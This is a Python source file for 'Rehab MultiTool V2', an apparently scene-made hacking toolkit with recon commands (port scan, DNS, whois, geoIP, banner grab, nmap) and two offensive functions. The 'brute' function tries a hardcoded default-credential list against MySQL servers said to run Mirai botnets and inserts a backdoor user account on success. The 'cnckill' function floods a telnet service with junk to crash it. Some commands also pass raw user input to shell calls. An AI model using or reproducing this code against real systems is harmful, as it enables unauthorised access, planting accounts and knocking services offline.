#REHAB MULTITOOL V2
#===================================================================
#DO NOT MODIFY THIS CODE, CHANGE THE CREDS OR PASS IT OFF AS YOUR OWN
#IF YOU PAID FOR THIS YOU WERE SCAMMED
import string
import subprocess
import sys
import os
import socket
import requests
from colored import fg,attr
from random import *
from time import sleep
import datetime as dt
#VALID COMMANDS
COMMANDS = ["pw","help","?","cnckill","brute","ping","portscan","dns","exit","cls","clear","geoip","banner","asn","whois","nmap"]

mottos = ['Take a Knee','Fuck Skids','Imma London Scammer','Red kinda sus tho','Pimp to simp','If you cannot code you are a skid','4563670','What the fuck is rehab?','I can\'t get no satisfaction','Now I am become death','Born to kill','Killionaire!','Just another day at the office','I was in admin','I like chicken nuggets','IPDowned is a script kiddie','RIP Project AK pistol','RIP Kobe','Simpin aint easy','Don\'t learn python','Flashcarding is fun','Don\'t buy off discord','Don\'t buy private sources','Don\'t buy vuln lists or ranges','My word is Poontang!','I can do magic tricks','Mana ouma is so NOT adorable']

win = "windows"
unix = "unix"

newprompt = True

creds = """
root:botnet
root:admin
admin:admin
root:123456
root:54321
root:
admin:password
root:12345
admin:
root:pass
root:password
admin:admin1234
root:1111
admin:1111
root:password
root:1234
root:user
admin:1234
admin:12345
admin:54321
admin:123456
admin:1234
admin:pass
"""

if os.name == "nt":
    OS = "windows"
else:
    OS = "unix"

def print_banner():
    global newprompt
    newprompt = True
    if OS == win: os.system("cls")
    else:
        os.system("clear")
    localip = socket.gethostbyname(socket.gethostname())
    motto = mottos[randrange(0,len(mottos))]
    print('%s      ██████  ███████ ██   ██  █████  ██████    ██    ██ ██████%s' % (fg(randrange(1,232)),attr(0))) 
    print("%s      ██   ██ ██      ██   ██ ██   ██ ██   ██   ██    ██      ██  %s" % (fg(randrange(1,232)),attr(0)))
    print("%s      ██████  █████   ███████ ███████ ██████    ██    ██  █████   %s" % (fg(randrange(1,232)),attr(0)))
    print("%s      ██   ██ ██      ██   ██ ██   ██ ██   ██    ██  ██  ██      %s" % (fg(randrange(1,232)),attr(0)))
    print("%s      ██   ██ ███████ ██   ██ ██   ██ ██████      ████   ███████ %s" % (fg(randrange(1,232)),attr(0)))
    print(f"%s      ~~ %s{motto}%s ~~                %s" % (fg(3),fg(14),fg(3),attr(0)))
    print("%s      TikTok%s @based.and.redpilled        %s" % (fg(3),fg(14),attr(0)))
    print("%s      Website%s https://darkvps.org/hosting         %s" % (fg(3),fg(14),attr(0)))
    print("\n")
    print(f"%s      Your Local IPv4:%s {localip}        %s " % (fg(3),fg(14),attr(0)))
    print(f"%s      Detected OS:%s {OS}            %s   " % (fg(3),fg(14),attr(0)))
    print("%s      Type%s help%s or %s?%s for a list of commands %s    " % (fg(3),fg(14),fg(3),fg(14),fg(3),attr(0)))
def request_info(url):
	request = requests.get(url)
	response = request.text
	for line in response.splitlines():
            print(f'%s   ╠[%s+%s]%s{line}' % (fg(14),fg(3),fg(14),fg(3)))
def help():
    global newprompt
    print("   %s╠═════════════════════════════════[%s+%s][%sCOMMANDS%s][%s+%s]════════════════════════════════════════╗%s" % (fg(14),fg(3),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0)))
    print("   %s╟ %sPING %s- %sFast ICMP Pinger                                                                 ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sPORTSCAN %s- %sSimple TCP Portscanner                                                       ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %s[NEW] %sNMAP %s- %sAdvanced Portscanner (NMAP must be installed and added to path)            ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %s[NEW] %sBRUTE %s- %sBrute Mirai SQL Database to gain access (requires PyMySQL)                ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %s[NEW] %sCNCKILL %s- %sAttempts to kill a Mirai CNC (requires telnetlib)                       ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %s[NEW] %sPW %s- %sSecure Password generator                                                    ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sDNS%s - %sDNS Lookup                                                                        ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sGEOIP %s-%s GEO IP Lookup                                                                   ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sBANNER %s- %sGRAB BANNER                                                                    ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sASN%s - %sASN LOOKUP                                                                        ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sWHOIS %s- %sDomain WHOIS Lookup                                                             ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sCLS %s- %sClear Screen                                                                      ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sEXIT %s- %sQuit Rehab V2                                                                    ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╠═════════════════════════════════════════════════════════════════════════════════════════╝%s" % (fg(14),attr(0)))
    newprompt = False
def check_ip(ip):
    i = 0
    ip_valid = True
    for element in ip:
        if element == '.':
            i += 1
        else:
            try:
                int(element)
            except:
                ip_valid = False
                pass
    if not i == 3:
        ip_valid = False
    return ip_valid
def check_yesno(str):
        if str.lower() == 'y':
            return True
        if str.lower() == 'n':
            return False
        else:
            return None
def tcpportscan(ip):
    url = f"https://api.hackertarget.com/nmap/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def cnckill(ip,port):
    payload = 'fuckyouskid' * 10000
    try:
        import telnetlib
    except:
        install = input("   %s╠[%s+%s]%sMissing module telnetlib! %sAttempt to install? (y/n)%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
        if 'y' in install.lower():
            os.system('pip install telnetlib')
            os.system('pip install telnetlib3')
        return
    try:
        tn = telnetlib.Telnet(ip,port)
    except:
        print("   %s╠[%s+%s]%sCould not connect! %sPlease check the info and your internet connetion.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
        return
    try:
        tn.write(payload.encode('ascii') + b"\n")
        tn.close()
    except:
        pass
    try:
        sleep(3)
        tn2 = telnetlib.Telnet(ip,port)
    except:
        print(f"   %s╠[%s+%s]%s CNC Killed!" % (fg(14),fg(3),fg(14),fg(2)))
        return
    print("   %s╠[%s+%s]%sExploit Failed! %sBetter luck next time!%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def dns(domain):
    url = f"https://api.hackertarget.com/dnslookup/?q={domain}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def bannergrab(ip):
    url = f"https://api.hackertarget.com/bannerlookup/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def brute(ip):
    try:
        import pymysql
    except:
        install = input("   %s╠[%s+%s]%sMissing module PyMySQL! %sAttempt to install? (y/n)%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
        if 'y' in install.lower():
            os.system('pip install pymysql')
        return
    try:
        print("   %s╠[%s+%s]%s Attempting to brute SQL server..." % (fg(14),fg(3),fg(14),fg(2)))
        
        conn = pymysql.connect(host=ip,user='root',password='root',charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
        cursor = conn.cursor()
        print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(14),fg(3),fg(14),fg(2)))
        cursor.execute('show databases')
        for a_dict in cursor.fetchall():
            for db in a_dict:
                try:
                    cursor.execute(f'use {a_dict[db]};')
                    print("   %s╠[%s+%s]%s Attempting to inject to table users..." % (fg(14),fg(3),fg(14),fg(2)))
                    cursor.execute("INSERT INTO users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                    print(f"   %s╠[%s+%s]%s Success on {ip} Username: ipdowned Password: isaskid" % (fg(14),fg(3),fg(14),fg(2)))
                    return
                except:
                    pass
    except Exception as e:
        if 'Access denied' in str(e):
            for combo in creds.splitlines():
                if combo == '':
                    continue
                uname = combo[:combo.index(':')]
                try:
                    password = combo[combo.index(':')+1:]
                except ValueError:
                    password = ''
                try:
                    print(f"   %s╠[%s+%s]%s Trying {uname}:{password}" % (fg(14),fg(3),fg(14),fg(2)))
                    conn = pymysql.connect(host=ip,user=uname,password=password,charset='utf8mb4',cursorclass=pymysql.cursors.DictCursor,read_timeout=5,write_timeout=5,connect_timeout=5)
                    print(f"   %s╠[%s+%s]%s Login Successfull!" % (fg(14),fg(3),fg(14),fg(2)))
                    cursor = conn.cursor()
                    cursor.execute('show databases')
                    for a_dict in cursor.fetchall():
                        for db in a_dict:
                            try:
                                cursor.execute(f'use {a_dict[db]};')
                                print("   %s╠[%s+%s]%s Attempting to inject to table users..." % (fg(14),fg(3),fg(14),fg(2)))
                                cursor.execute("INSERT INTO users VALUES (NULL, 'ipdowned', 'isaskid', 0, 0, 0, 0, -1, 1, 30, '');")
                                print(f"   %s╠[%s+%s]%s Success on {ip} Username: ipdowned Password: isaskid" % (fg(14),fg(3),fg(14),fg(2)))
                                return
                            except:
                                pass
                except:
                    pass
        else:
            pass
    print("   %s╠[%s+%s]%sBrute Failed! %sBetter luck next time!%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
    
def geoip(ip):
    url = f"https://api.hackertarget.com/geoip/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def whoislookup(domain):
    url = f"https://api.hackertarget.com/whois/?q={domain}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def asntoip(asn):
    url = f"https://api.hackertarget.com/aslookup/?q={asn}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def iptoasn(ip):
    url = f"https://api.hackertarget.com/aslookup/?q={ip}"
    response = requests.get(url)
    if response.status_code == 200:
        request_info(url)
    else:
        print("   %s╠[%s+%s]%sAPI Error! %sCheck your internet connection and try again.%s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
def ping(ip):
    while not check_ip(ip):
        ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
    print("   %s╠[%s+%s]%sCTRL+C %sto stop pinging" % (fg(14),fg(3),fg(14),fg(1),fg(3)))
    sleep(0.5)
    if OS == win:
        while True:
            try:
                subprocess.check_call(f"PING {ip} -n 1 | FIND \"TTL=\" > NUL",shell=True)
                print(f'   %s╠[%s+%s] Reply from %s{ip}' % (fg(14),fg(3),fg(14),fg(3)))
            except subprocess.CalledProcessError:
                    print(f"   %s╠[%s+%s]%s{ip} %sis offline%s" % (fg(14),fg(3),fg(14),fg(3),fg(1),attr(0)))
            except KeyboardInterrupt:
                    break
    else:
        while True:
            try:
                subprocess.check_call(f"PING {ip} -c1 > /dev/null 2>&1",shell=True)
                print(f'   %s╠[%s+%s] Reply from %s{ip}' % (fg(14),fg(3),fg(14),fg(3)))
            except subprocess.CalledProcessError:
                    print(f"   %s╠[%s+%s]%s{ip} %sis offline%s" % (fg(14),fg(3),fg(14),fg(3),fg(1),attr(0)))
            except KeyboardInterrupt:
                    break
def nmap():
    global newprompt
    if os.system('nmap > nul 2>&1') == 1:
        defaultpath = repr('C:\Program Files (x86)\nmap')
        print(f"   %s╠[%s+%s]                  You do not have NMAP installed or it is not added to the PATH" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  " % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  ---------------NMAP WINDOWS INSTALL TUTORIAL----------------" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [1] Download the latest version of NMAP from https://nmap.org/download.html" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  Look for latest stable release under Windows Binaries" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [2] Go through the install process and take note of where NMAP is installed to." % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  By default it should be {defaultpath}" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [3] Go to Control Panel > System and Security > System > Advanced System Settings" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  > Environment Variables" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [4] Look at the box labeled System Variables and double click on Path" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [5] Hit New and enter the location where nmap is installed to ({defaultpath})" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  [6] Open a new command prompt window and enter 'nmap'. if it gives you the nmap options" % (fg(14),fg(3),fg(14)))
        print(f"   %s╠[%s+%s]                  you are done!" % (fg(14),fg(3),fg(14)))
    else:
        print(f"   %s╠[%s+%s]%s [Enter command or type -help for help]" % (fg(14),fg(3),fg(14),fg(3)))
        pscan = input(f"   %s╠[%s+%s]%s nmap " % (fg(14),fg(3),fg(14),fg(3))).strip()
        os.system(f'nmap {pscan}')
        newprompt = True
def pw():
    try:
        characters = string.ascii_letters + string.punctuation  + string.digits
        password =  "".join(choice(characters) for x in range(randint(10, 20)))
        print(f"   %s╠[%s+%s]%sYour Password Is:%s {password}" % (fg(14),fg(3),fg(14),fg(3),fg(14)))
        save=input(f"   %s╠[%s+%s]%s Would you like to save your password? (y/n) :" % (fg(14),fg(3),fg(14),fg(3)))
        while not save.lower() in ['y','n', 'yes', 'no']:
            save=input(f"   %s╠[%s+%s]%s Invalid choice. Would you like to save your password? (y/n) :" % (fg(14),fg(3),fg(14),fg(3)))
        if save.lower() == 'y' or save.lower() == 'yes':
            label=input(f"   %s╠[%s+%s]%s Enter a label for this password? :" % (fg(14),fg(3),fg(14),fg(3)))
            f = open("passwords.txt", "a")
            f.write(f"[{dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Password for {label} : {password}\r\n")
            f.close()
            print("   %s╠[%s+%s]%s Password Saved to passwords.txt" % (fg(14),fg(3),fg(14),fg(2)))
    except KeyboardInterrupt:
        print('')
        pass
def take_commands():
    global newprompt
    if newprompt:
        newprompt = False
        command = input("   %s╔════════════[%s$%s]\n   ╠═══%srehab%s@%sterminal%s ~%s" % (fg(14),fg(2),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0))).lower()
    else:
        command = input("   %s╠════════════[%s$%s]\n   ╠═══%srehab%s@%sterminal%s ~%s" % (fg(14),fg(2),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0))).lower()
    if command not in COMMANDS:
        print("   %s╠[%s+%s]%sInvalid command. %sType %s?%s or %sHelp%s for a list of commands %s" % (fg(14),fg(3),fg(14),fg(1),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0)))
        take_commands()
    if command == "ping":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   ╠[+]Invalid IP Address. Enter Valid IP:")
            ping(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "portscan":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            tcpportscan(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "pw":
        pw()
    elif command == "asn":
        try:
            print("   %s╠[%s+%s]%sSelect 1 or 2:" % (fg(14),fg(3),fg(14),fg(3)))
            print("   %s╠[%s+%s]%s1. IP TO ASN" % (fg(14),fg(3),fg(14),fg(3)))
            print("   %s╠[%s+%s]%s2. ASN TO IP" % (fg(14),fg(3),fg(14),fg(3)))
            choice=input("   %s╠[%s+%s]%s: "% (fg(14),fg(3),fg(14),fg(3)))
            while not choice in ['1','2']:
                choice=input("   %s╠[%s+%s]%sInvalid Choice. %sChoose 1 or 2: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            if choice == '1':
                ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
                while not check_ip(ip):
                    ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
                iptoasn(ip)
            else:
                asn = input("   %s╠[%s+%s]%sEnter ASN:" % (fg(14),fg(3),fg(14),fg(3)))
                asntoip(asn)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "whois":
        try:
            domain = input("   %s╠[%s+%s]%sEnter Domain:" % (fg(14),fg(3),fg(14),fg(3)))
            whoislookup(domain)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "dns":
        try:
            domain = input("   %s╠[%s+%s]%sEnter Domain:" % (fg(14),fg(3),fg(14),fg(3)))
            dns(domain)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "geoip":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            geoip(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "cnckill":
        try:
            ip = input("   %s╠[%s+%s]%sEnter Botnet IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            port = input("   %s╠[%s+%s]%sEnter Botnet Port:" % (fg(14),fg(3),fg(14),fg(3))).strip()
            try:
                while not int(port) in range(1,65536):
                    port = input("   %s╠[%s+%s]%sPort must be between 1 and 65535:" % (fg(14),fg(3),fg(14),fg(3)))
                cnckill(ip,port)
            except:
                print("   %s╠[%s+%s]%sInvalid Port!" % (fg(14),fg(3),fg(14),fg(3)))
                pass
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "brute":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            brute(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "banner":
        try:
            ip = input("   %s╠[%s+%s]%sEnter IP Address:" % (fg(14),fg(3),fg(14),fg(3)))
            while not check_ip(ip):
                ip = input("   %s╠[%s+%s]%sInvalid IP Address. %sEnter a Valid IP: %s" % (fg(14),fg(3),fg(14),fg(1),fg(3),attr(0)))
            bannergrab(ip)
        except KeyboardInterrupt:
            print('')
            pass
    elif command == "help":
        help()
    elif command == "nmap":
        nmap()
    elif command == "?":
        help()
    elif command == "clear":
        print_banner()
    elif command == "cls":
        print_banner()
    elif command == "exit":
        sys.exit("   %s╠[%s+%s]%sGoodbye" % (fg(14),fg(3),fg(14),fg(2)))
    elif command == "quit":
        sys.exit("   %s╠[%s+%s]%sGoodbye%s" % (fg(14),fg(3),fg(14),fg(2),attr(0)))

print_banner()
if OS == win:
    os.system("title Rehab MultiTool V2")
while True:
    try:
        take_commands()
    except KeyboardInterrupt:
        print('')
        pass